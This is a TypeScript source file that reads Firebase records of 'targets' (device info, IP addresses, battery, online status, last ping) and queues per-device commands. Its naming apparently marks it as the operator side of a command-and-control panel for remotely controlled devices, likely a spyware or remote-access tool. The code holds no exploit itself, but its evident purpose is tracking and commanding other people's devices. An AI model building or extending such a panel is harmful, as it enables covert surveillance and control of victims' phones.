import { onValue, push, ref, set } from 'firebase/database';
import { database } from '@/lib/firebase';
import { Target, CommandAction } from '@/types/target';

export function subscribeToTargets(callback: (targets: Target[]) => void) {
  const logsRef = ref(database, '/Logs');
  const activeTargetsRef = ref(database, '/kei-vault/active_targets');

  let latestLogs: Record<string, any> = {};
  let latestActiveTargets: Record<string, any> = {};

  const mergeTargets = () => {
    const allIds = new Set<string>([
      ...Object.keys(latestLogs),
      ...Object.keys(latestActiveTargets),
    ]);

    const targetArray: Target[] = Array.from(allIds).map((id) => {
      const logData = latestLogs[id] ?? {};
      const activeData = latestActiveTargets[id] ?? {};

      return {
        id,
        deviceInfo: {
          ...logData,
          ...(typeof logData.deviceInfo === 'object' ? logData.deviceInfo : {}),
        },
        ip:
          logData.ip ||
          logData.deviceInfo?.ip ||
          activeData.ip ||
          activeData.deviceInfo?.ip,
        status: activeData.status ?? (activeData.online ? 'ONLINE' : 'OFFLINE'),
        battery: typeof activeData.battery === 'number' ? activeData.battery : undefined,
        lastSeen: activeData.last_seen ?? activeData.lastSeen,
        last_ping: activeData.last_ping,
        ...activeData,
      } as Target;
    });

    callback(targetArray);
  };

  const unsubscribeLogs = onValue(logsRef, (snapshot) => {
    latestLogs = snapshot.val() ?? {};
    mergeTargets();
  });

  const unsubscribeActive = onValue(activeTargetsRef, (snapshot) => {
    latestActiveTargets = snapshot.val() ?? {};
    mergeTargets();
  });

  return () => {
    unsubscribeLogs();
    unsubscribeActive();
  };
}

export async function sendCommand(deviceId: string, action: CommandAction) {
  const commandsRef = ref(database, `/Commands/${deviceId}`);
  const newCommandRef = push(commandsRef);

  await set(newCommandRef, {
    action,
    timestamp: Date.now(),
    status: 'pending',
  });

  return {
    commandId: newCommandRef.key,
    deviceId,
    action,
  };
}
